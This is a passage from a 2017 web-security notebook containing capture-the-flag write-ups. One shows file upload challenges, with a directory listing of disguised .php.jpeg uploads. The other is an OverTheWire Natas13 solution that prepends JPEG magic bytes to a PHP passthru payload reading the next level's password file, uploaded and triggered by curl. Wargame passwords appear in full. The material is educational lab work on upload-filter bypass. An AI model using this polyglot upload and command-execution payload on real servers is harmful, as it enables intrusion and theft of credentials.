<span class="go">drwxr-xr-x 7 root     root     4096 Feb 18 22:40 ..</span>
<span class="go">-rw-r--r-- 1 www-data www-data   40 Apr 21 16:58 command.php.jpeg</span>
<span class="go">/var/www/html/uploads2:</span>
<span class="go">total 192</span>
<span class="go">drwxr-xr-x 2 www-data www-data  4096 Apr 21 19:05 .</span>
<span class="go">drwxr-xr-x 7 root     root      4096 Feb 18 22:40 ..</span>
<span class="go">-rw-r--r-- 1 www-data www-data 32764 Apr 21 17:22 command.php.jpeg</span>
<span class="go">-rw-r--r-- 1 www-data www-data 10040 Apr 21 17:27 command10000.php.jpeg</span>
<span class="go">-rw-r--r-- 1 www-data www-data 10000 Apr 21 17:26 command10000.php.jpg</span>
<span class="go">-rw-r--r-- 1 www-data www-data 32154 Apr 21 18:45 fake.php.jpeg</span>
<span class="go">-rw-r--r-- 1 www-data www-data 32764 Apr 21 17:17 img_1771.jpg</span>
<span class="go">-rw-r--r-- 1 www-data www-data 32154 Apr 21 19:05 trick.php.jpeg</span>
<span class="go">-rw-r--r-- 1 www-data www-data 32154 Apr 21 18:39 x.php.jpeg</span>
<span class="go">/var/www/html/uploads3:</span>
<span class="go">total 8</span>
<span class="go">drwxr-xr-x 2 www-data root 4096 Feb 18 22:39 .</span>
<span class="go">drwxr-xr-x 7 root     root 4096 Feb 18 22:40 ..</span>
<span class="go">Canon</span>
</pre></div>
</div>
<p>To complete the challenge we just needed to fetch SECRETFILE:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~$</span> curl --silent --remote-name http://<span class="nv">$IP</span>/l337saucel337/SECRETFILE
<span class="gp">hacker@kali:~$</span> cat SECRETFILE
<span class="go">Great job so far. This box has 3 uploaders.</span>

<span class="go">The first 2 are pure php, the last one is php w/jquery.</span>

<span class="go">To get credit for this challenge, please submit a write-up or instructions</span>
<span class="go">on how you compromised the uploader or uploaders. If you solve 1, 2, or all</span>
<span class="go">of the uploader challenges, feel free to shoot me an email and let me know!</span>

<span class="go">admin@top-hat-sec.com</span>

<span class="go">Thanks for playing!</span>
<span class="go">http://www.top-hat-sec.com</span>
</pre></div>
</div>
</div>
<div class="section" id="natas13-only-first-11-bytes-are-jpeg">
<h3>8.4.2.3. Natas13 - only first 11 bytes are JPEG<a class="headerlink" href="#natas13-only-first-11-bytes-are-jpeg" title="Permalink to this headline">¶</a></h3>
<p>But that trick doesn’t always work easily. Natas13 disallows images larger than 1000 bytes which can take some work to create. A simpler alternative in this case was to create a php file consisting of the first 11 bytes identifying JPEG JFIF files, with our exploit php script appended after that. Here are the details.</p>
<p>The challenge <a class="reference external" href="http://overthewire.org/wargames/natas/">OverTheWire Natas</a> teaches the basics of serverside web security. <a class="reference external" href="http://natas13.natas.labs.overthewire.org/">Natas Level 13 -&gt; 14</a> (user id nata13, password “jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY”) is backed by a server-side script using <code class="docutils literal"><span class="pre">exif_imagetype</span></code> check to make sure the uploaded file is an image file. Here we use several techniques to pass the image check while still uploading php to display the contents of the file <code class="file docutils literal"><span class="pre">/etc/natas_webpass/natas14</span></code> (password for the next Natas level).</p>
<p>The php exploit code is:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># JPEG leading 11 bytes: \xFF + SOI + \xFF + APP0 + \x00 + \x10 + &quot;JFIF&quot; + \x00</span>
</span><span class="hll"><span class="nv">JFIF_HEADER</span><span class="o">=</span><span class="s2">&quot;\xFF\xD8\xFF\xE0\x00\x10JFIF\x00&quot;</span>
</span><span class="hll"><span class="nv">EXPLOIT</span><span class="o">=</span><span class="s1">&#39;&lt;?php passthru(&quot;echo -n PASS; cat /etc/natas_webpass/natas14&quot;); ?&gt;&#39;</span>
</span><span class="hll"><span class="nb">echo</span> -e <span class="s2">&quot;</span><span class="nv">$JFIF_HEADER$EXPLOIT</span><span class="s2">&quot;</span> &gt; natas14.php
</span><span class="hll"><span class="c1"># upload to web server and capture saved filename</span>
</span><span class="nv">upload</span><span class="o">=</span><span class="k">$(</span> <span class="se">\</span>
  curl --silent --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY <span class="se">\</span>
    --form <span class="nv">filename</span><span class="o">=</span>natas14.php <span class="se">\</span>
    --form <span class="nv">uploadedfile</span><span class="o">=</span>@natas14.php <span class="se">\</span>
    --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Upload File&quot;</span> <span class="se">\</span>
    http://natas13.natas.labs.overthewire.org/index.php <span class="se">\</span>
  <span class="p">|</span> grep <span class="s1">&#39;a href=&quot;upload/&#39;</span> <span class="se">\</span>
<span class="k">)</span>
<span class="nv">file</span><span class="o">=</span><span class="si">${</span><span class="nv">upload</span><span class="p">#*upload/</span><span class="si">}</span>
<span class="nv">file</span><span class="o">=</span><span class="si">${</span><span class="nv">file</span><span class="p">%%</span><span class="se">\&quot;</span><span class="p">*</span><span class="si">}</span>
curl --silent <span class="se">\</span>
     --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY <span class="se">\</span>
     http://natas13.natas.labs.overthewire.org/upload/<span class="nv">$file</span> <span class="p">|</span>
tail -n1 <span class="p">|</span> tr -cd <span class="s1">&#39;[:print:]&#39;</span>  <span class="p">|</span> sed -e <span class="s1">&#39;s/^.*PASS//;s/$/\</span>
<span class="s1">/&#39;</span>
</pre></div>
</div>
<p>Running this gives the Natas 14 password:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~$ #</span> JPEG leading <span class="m">11</span> bytes: <span class="se">\x</span>FF + SOI + <span class="se">\x</span>FF + APP0 + <span class="se">\x</span><span class="m">00</span> + <span class="se">\x</span><span class="m">10</span> + <span class="s2">&quot;JFIF&quot;</span> + <span class="se">\x</span><span class="m">00</span>
</span><span class="hll"><span class="gp">hacker@kali:~$</span> <span class="nv">JFIF_HEADER</span><span class="o">=</span><span class="s2">&quot;\xFF\xD8\xFF\xE0\x00\x10JFIF\x00&quot;</span>
</span><span class="hll"><span class="gp">hacker@kali:~$</span> <span class="nv">EXPLOIT</span><span class="o">=</span><span class="s1">&#39;&lt;?php passthru(&quot;echo -n PASS; cat /etc/natas_webpass/natas14&quot;); ?&gt;&#39;</span>
</span><span class="hll"><span class="gp">hacker@kali:~$</span> <span class="nb">echo</span> -e <span class="s2">&quot;</span><span class="nv">$JFIF_HEADER$EXPLOIT</span><span class="s2">&quot;</span> &gt; natas14.php
</span><span class="hll"><span class="gp">hacker@kali:~$ #</span> upload to web server and capture saved filename
</span><span class="gp">hacker@kali:~$ upload=$</span><span class="o">(</span> <span class="se">\</span>
&gt;   curl --silent --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY <span class="se">\</span>
&gt;     --form <span class="nv">filename</span><span class="o">=</span>natas14.php <span class="se">\</span>
&gt;     --form <span class="nv">uploadedfile</span><span class="o">=</span>@natas14.php <span class="se">\</span>
&gt;     --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Upload File&quot;</span> <span class="se">\</span>
&gt;     http://natas13.natas.labs.overthewire.org/index.php <span class="se">\</span>
&gt;   <span class="p">|</span> grep <span class="s1">&#39;a href=&quot;upload/&#39;</span> <span class="se">\</span>
&gt; <span class="o">)</span>
<span class="gp">hacker@kali:~$ file=${upload#</span>*upload/<span class="o">}</span>
<span class="gp">hacker@kali:~$ file=${file%%</span><span class="se">\&quot;</span>*<span class="o">}</span>
<span class="gp">hacker@kali:~$</span> curl --silent <span class="se">\</span>
&gt;      --user natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY <span class="se">\</span>
&gt;      http://natas13.natas.labs.overthewire.org/upload/<span class="nv">$file</span> <span class="p">|</span>
<span class="gp">&gt;</span> tail -n1 <span class="p">|</span> tr -cd <span class="s1">&#39;[:print:]&#39;</span>  <span class="p">|</span> sed -e <span class="s1">&#39;s/^.*PASS//;s/$/\</span>
<span class="s1">&gt; /&#39;</span>
<span class="hll"><span class="go">Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</span>
</span></pre></div>
</div>
</div>
</div>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="loadlibrary.html" class="btn btn-neutral float-right" title="8.5. loadlibrary" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="exfiltration.html" class="btn btn-neutral" title="8.3. Exfiltration" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.2',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>